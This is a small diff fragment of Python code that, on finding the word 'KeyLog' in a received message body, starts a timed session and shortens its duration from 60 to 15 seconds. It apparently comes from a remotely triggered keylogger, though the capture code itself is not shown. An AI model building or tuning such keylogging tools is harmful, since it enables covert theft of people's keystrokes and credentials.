@@ -68,7 +68,7 @@ end = len(body)  # Define the end position in the string
 
 if body.find("KeyLog", start, end) != -1:
     # Set the duration in seconds (e.g., 60 seconds)
-    duration = 60
+    duration = 15
 
     # Record the start time
     start_time = time.time()
